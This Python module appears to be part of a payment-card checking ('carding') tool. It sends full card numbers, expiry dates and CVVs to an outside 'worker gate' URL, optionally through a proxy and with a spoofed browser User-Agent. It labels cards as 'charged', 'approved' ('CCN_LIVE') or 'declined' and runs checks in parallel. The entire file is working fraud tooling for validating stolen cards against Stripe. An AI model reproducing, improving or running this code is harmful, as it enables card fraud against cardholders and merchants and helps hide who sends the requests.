"""
Stripe Worker Charge API (separate from Balliante store).
Single source for the mohsinop worker gate:
  GET http://mohsinop.sofimohusin3.workers.dev/stripe?cc=<cc|mm|yy|cvv>

Response shape: card_check, registration, stripe_payment_method, setup_intent, summary.
Returns normalized: {"status": "charged"|"approved"|"declined"|"error", "response": str}
"""

import json
import asyncio
from urllib.parse import quote_plus
from concurrent.futures import ThreadPoolExecutor

# Worker gate config
STRIPE_WORKER_BASE = "http://mohsinop.sofimohusin3.workers.dev/stripe"
STRIPE_WORKER_TIMEOUT = 25

_worker_executor = ThreadPoolExecutor(max_workers=10)


def _parse_stripe_worker_response(data):
    """
    Parse Stripe worker API JSON into status and response message.
    API shape: card_check, registration, stripe_payment_method, setup_intent, summary.
    """
    if not data or not isinstance(data, dict):
        return "error", "NO_RESPONSE"
    summary = data.get("summary") or {}
    setup_intent = data.get("setup_intent") or {}
    success = summary.get("success") is True
    si_success = setup_intent.get("success") is True
    si_data = setup_intent.get("data") or {}
    error_info = si_data.get("error") or {}
    msg = (error_info.get("message") or "").strip()

    if success and si_success:
        return "charged", "SETUP_SUCCESS_CHARGED"
    if success and not si_success:
        if msg:
            resp = msg.upper().replace(" ", "_")[:60]
            return "declined", resp
        return "approved", "CCN_LIVE"
    if not success and msg:
        resp = msg.upper().replace(" ", "_")[:60]
        if any(x in msg.lower() for x in ("incorrect", "invalid", "expired", "declined", "do not honor")):
            return "declined", resp
        if any(x in msg.lower() for x in ("cvc", "security", "zip", "address")):
            return "approved", resp
        return "declined", resp
    status_str = summary.get("status") or "unknown"
    return "error", (status_str.upper().replace(" ", "_")[:50] or "UNKNOWN")


def stripe_worker_charge_sync(card, mes, ano, cvv, proxy=None):
    """
    Stripe worker gate check (sync).
    GET {STRIPE_WORKER_BASE}?cc=cc|mm|yy|cvv
    Returns: {"status": "charged"|"approved"|"declined"|"error", "response": str}
    """
    try:
        yy = str(ano)
        if len(yy) == 4 and yy.startswith("20"):
            yy = yy[2:]
        cc_param = f"{card}|{mes}|{yy}|{cvv}"
        url = f"{STRIPE_WORKER_BASE}?cc={quote_plus(cc_param)}"
        import urllib.request
        req = urllib.request.Request(
            url,
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"},
        )
        opener = urllib.request.build_opener()
        if proxy and str(proxy).strip():
            px = str(proxy).strip()
            if not px.startswith(("http://", "https://")):
                px = f"http://{px}"
            opener.add_handler(urllib.request.ProxyHandler({"http": px, "https": px}))
        with opener.open(req, timeout=STRIPE_WORKER_TIMEOUT) as r:
            raw = r.read().decode("utf-8", errors="replace")
        data = json.loads(raw)
        status, response = _parse_stripe_worker_response(data)
        return {"status": status, "response": response}
    except asyncio.CancelledError:
        return {"status": "error", "response": "CANCELLED"}
    except Exception as e:
        return {"status": "error", "response": (str(e).upper().replace(" ", "_")[:50] or "REQUEST_FAILED")}


async def async_stripe_worker_charge(card, mes, ano, cvv, proxy=None):
    """Async wrapper for Stripe worker gate check."""
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(
        _worker_executor,
        stripe_worker_charge_sync,
        card, mes, ano, cvv, proxy,
    )
